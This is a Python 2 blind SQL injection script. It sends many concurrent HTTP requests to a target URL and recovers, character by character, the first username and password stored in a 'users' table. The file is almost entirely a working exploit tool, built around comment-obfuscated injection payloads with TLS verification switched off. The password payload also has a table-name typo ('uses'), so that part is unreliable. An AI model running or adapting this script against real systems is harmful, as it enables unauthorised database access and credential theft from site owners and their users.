#!/usr/bin/python

import requests
import sys
import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_NUM_THREADS = 20

## TODO START OF: UPDATE BOOLEAN CONDITION ACCORDINGLY
def matchTrueCondition(request):
	content_length = int(request.headers['Content-Length'])
	if (content_length > 20):
		return True
	return False
## TODO END OF: UPDATE BOOLEAN CONDITION ACCORDINGLY


def getChar(target_url, params, inj_param, inj_str):
	for j in range(32, 126):
		key = inj_param
		value = inj_str.replace("[PLACEHOLDER]", str(j))
		params[key] = value

		# CHANGE TO NECESSARY METHOD
		result = requests.get(target_url, params=params, verify=False)

		if matchTrueCondition(result):
			return j

	return None

def getFieldLength(target_url, params, inj_param, inj_str, max_field_len=300):
	for j in range(1, max_field_len):
		key = inj_param
		value = inj_str.replace("[PLACEHOLDER]", str(j))
		params[key] = value

		# CHANGE TO NECESSARY METHOD
		result = requests.get(target_url, params=params, verify=False)

		if matchTrueCondition(result):
			return j

	return 0

def getField(target_url, params, inj_param, field_size_sqli_string, field_sqli_string, n=DEFAULT_NUM_THREADS):
	field_size = getFieldLength(target_url, params, inj_param, field_size_sqli_string)

	base_string_l = list('_' * field_size + " [Field Size=" + str(field_size) + "]")
	sys.stdout.write("\r" + ''.join(base_string_l))
	sys.stdout.flush()

	threads = {}
	max_workers = min(field_size, n)
	with ThreadPoolExecutor(max_workers=max_workers) as executor:
		for i in range(1, field_size+1):
			injection_string = field_sqli_string % i
			threads[executor.submit(getChar, target_url, params, inj_param, injection_string)] = i
		for task in as_completed(threads):
			if not isinstance(task.result(), int):
				continue
			base_string_l[threads[task]-1] = chr(task.result())
			sys.stdout.write("\r" + ''.join(base_string_l))
			sys.stdout.flush()

def main():
	if len(sys.argv) < 2 or len(sys.argv) > 3:
		print "(+) usage: %s <target> [<num_max_threads>]" % sys.argv[0]
		print "(+) e.g: %s https://192.168.1.42/search?q=test" % sys.argv[0]
		sys.exit(-1)

	target_url = sys.argv[1]
	num_threads = DEFAULT_NUM_THREADS

	if len(sys.argv) == 3:
		num_threads = sys.argv[2]

	parsed = urlparse.urlparse(target_url)
	target_url = target_url.split('?')[0]
	params = urlparse.parse_qs(parsed.query)

	inj_param = None

	for key, value in params.items():
		if value[0] == "SQLI":
			inj_param = key
			del(params[key])

	## TODO START OF: CHANGE ACCORDINGLY
	USERNAME_SIZE_SQLI_STRING="test'OR(length((select/**/login/**/FROM/**/users/**/LIMIT1)))=[PLACEHOLDER])#"
	USERNAME_SQLI_STRING="test'OR(ascii(substring((select/**/login/**/FROM/**/users/**/LIMIT1),%d,1)))=[PLACEHOLDER])#"
	PASSWORD_SIZE_SQLI_STRING="test'OR(length((select/**/password/**/FROM/**/users/**/LIMIT1)))=[PLACEHOLDER])#"
	PASSWORD_SQLI_STRING="test'OR(ascii(substring((select/**/password/**/FROM/**/uses/**/LIMIT1),%d,1)))=[PLACEHOLDER])#"
	print "(+) Retrieving first username ...."
	getField(target_url, params, inj_param, USERNAME_SIZE_SQLI_STRING, USERNAME_SQLI_STRING, num_threads)
	print "\n(+) done!"
	print "(+) Retrieving first password ...."
	getField(target_url, params, inj_param, PASSWORD_SIZE_SQLI_STRING, PASSWORD_SQLI_STRING, num_threads)
	print "\n(+) done!"
	## TODO END OF: CHANGE ACCORDINGLY

if __name__ == "__main__":
	main()
